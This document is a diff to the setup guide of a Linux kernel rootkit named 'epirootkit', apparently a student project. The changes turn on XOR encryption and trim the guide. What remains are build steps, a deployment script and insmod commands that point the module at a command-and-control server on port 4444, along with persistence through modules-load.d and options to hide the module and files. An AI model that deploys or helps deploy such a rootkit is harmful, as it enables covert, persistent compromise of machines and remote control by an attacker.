@@ -40,28 +40,23 @@ Edit `rootkit/core/config.h` before building:
 #define C2_SERVER_PORT 4444
 
 // Feature settings
-#define ENABLE_ENCRYPTION 0      // Encryption disabled
+#define ENABLE_ENCRYPTION 1      // XOR encryption enabled
 #define ENABLE_PERSISTENCE 1     // Auto-install persistence
 #define ENABLE_MODULE_HIDING 1   // Hide module by default
 #define ENABLE_FILE_HIDING 1     // Hide files with prefixes
 ```
 
-## Build Process
+## Build
 
 ```bash
 cd rootkit
 make clean && make
 # ✓ Build successful: epirootkit.ko created
-
-# Verify build
-ls -la epirootkit.ko
-file epirootkit.ko
-# epirootkit.ko: ELF 64-bit LSB relocatable, x86-64
 ```
 
 ## Deployment
 
-### Method 1: Deployment Script (Recommended)
+### Quick Deploy (Recommended)
 ```bash
 # Deploy with domain name
 sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
@@ -73,15 +68,7 @@ sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
 sudo ./deploy_rootkit.sh
 ```
 
-**What it does:**
-1. Validates module and root privileges
-2. Deploys to `/lib/modules/$(uname -r)/extra/`
-3. Sets up autoload via `/etc/modules-load.d/`
-4. Updates dependencies with `depmod -a`
-5. Loads module immediately
-6. Verifies deployment
-
-### Method 2: Manual Loading
+### Manual Loading
 ```bash
 # Load with domain
 sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
@@ -93,26 +80,7 @@ sudo insmod epirootkit.ko address=192.168.1.100 port=4444
 sudo insmod epirootkit.ko
 ```
 
-## Verification
-
-### Check Loading
-```bash
-# Check if loaded (may be hidden if stealth enabled)
-lsmod | grep epirootkit
-
-# Alternative check if module is hidden
-ls -la /sys/module/epirootkit
-
-```
-
-
-## Domain Support
-
-The rootkit supports both domain names and IP addresses for C2 connectivity.
-
-For complete DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
-
-## Management Commands
+## Management
 
 ### Check Status
 ```bash
@@ -132,10 +100,4 @@ sudo ./deploy_rootkit.sh uninstall
 # ✓ Dependencies updated
 ```
 
-### Update Module
-```bash
-# Rebuild and redeploy
-make clean && make
-sudo ./deploy_rootkit.sh update
-# ✓ Module updated and reloaded
-```
+**Domain Support**: The rootkit supports both domain names and IP addresses. For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
